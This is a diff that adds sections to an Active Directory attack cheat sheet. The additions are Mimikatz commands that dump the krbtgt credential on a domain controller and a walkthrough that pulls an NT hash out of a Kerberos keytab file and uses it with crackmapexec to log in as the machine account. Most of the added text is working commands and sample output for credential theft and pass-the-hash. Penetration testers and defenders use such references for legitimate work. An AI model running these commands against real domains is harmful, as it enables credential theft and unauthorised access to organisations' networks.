@@ -13,6 +13,7 @@
     * Using vssadmin
     * Using DiskShadow
     * Using Mimikatz DCSync
+    * Using Mimikatz sekurlsa
   * [Password in AD User comment](#password-in-ad-user-comment)
   * [Pass-the-Ticket Golden Tickets](#pass-the-ticket-golden-tickets)
   * [Pass-the-Ticket Silver Tickets](#pass-the-ticket-silver-tickets)
@@ -28,6 +29,7 @@
   * [Resource-Based Constrained Delegation](#resource-based-constrained-delegation)
   * [PrivExchange attack](#privexchange-attack)
   * [Password spraying](#password-spraying)
+  * [Extract accounts from /etc/krb5.keytab](#extract-accounts-from-etc-krb5-keytab)
   * [PXE Boot image attack](#pxe-boot-image-attack)
 
 ## Tools
@@ -393,6 +395,15 @@ mimikatz# lsadump::dcsync /domain:htb.local /user:krbtgt
 
 :warning: Read-Only Domain Controllers are not allowed to pull password data for users by default.
 
+#### Using Mimikatz sekurlsa
+
+Dumps credential data in an Active Directory domain when run on a Domain Controller.
+:warning: Requires administrator access with debug or Local SYSTEM rights
+
+```powershell
+sekurlsa::krbtgt
+lsadump::lsa /inject /name:krbtgt
+```
 
 ### Password in AD User comment
 
@@ -902,6 +913,30 @@ Most of the time the best passwords to spray are :
 - Welcome1
 - $Companyname1
 
+### Extract accounts from /etc/krb5.keytab
+
+The service keys used by services that run as root are usually stored in the keytab file /etc/krb5.keytab. This service key is the equivalent of the service's password, and must be kept secure. 
+
+Use [`klist`](https://adoptopenjdk.net/?variant=openjdk13&jvmVariant=hotspot) to read the keytab file and parse its content. The key that you see when the [key type](https://cwiki.apache.org/confluence/display/DIRxPMGT/Kerberos+EncryptionKey) is 23  is the actual NT Hash of the user.
+
+```powershell
+$ klist.exe -t -K -e -k FILE:C:\Users\User\downloads\krb5.keytab
+[...]
+[26] Service principal: host/COMPUTER@DOMAIN
+	 KVNO: 25
+	 Key type: 23
+	 Key: 6b3723410a3c54692e400a5862256e0a
+	 Time stamp: Oct 07,  2019 09:12:02
+[...]
+```
+
+Connect to the machine using the account and the hash with CME.
+
+```powershell
+$ crackmapexec 10.XXX.XXX.XXX -u 'COMPUTER$' -H "6b3723410a3c54692e400a5862256e0a" -d "DOMAIN"
+CME          10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\COMPUTER$ 6b3723410a3c54692e400a5862256e0a  
+```
+
 
 ### PXE Boot image attack
 
@@ -1006,3 +1041,5 @@ PXE allows a workstation to boot from the network by retrieving an operating sys
 * [Pass-the-Hash Is Dead: Long Live LocalAccountTokenFilterPolicy - March 16, 2017 - harmj0y](http://www.harmj0y.net/blog/redteaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/)
 * [Kerberos (II): How to attack Kerberos? - June 4, 2019 - ELOY PÉREZ](https://www.tarlogic.com/en/blog/how-to-attack-kerberos/)
 * [Attacking Read-Only Domain Controllers (RODCs) to Own Active Directory -  Sean Metcalf](https://adsecurity.org/?p=3592)
+* [All you need to know about Keytab files - Pierre Audonnet [MSFT] - January 3, 2018](https://blogs.technet.microsoft.com/pie/2018/01/03/all-you-need-to-know-about-keytab-files/)
+* [Taming the Beast Assess Kerberos-Protected Networks - Emmanuel Bouillon](https://www.blackhat.com/presentations/bh-europe-09/Bouillon/BlackHat-Europe-09-Bouillon-Taming-the-Beast-Kerberous-slides.pdf)
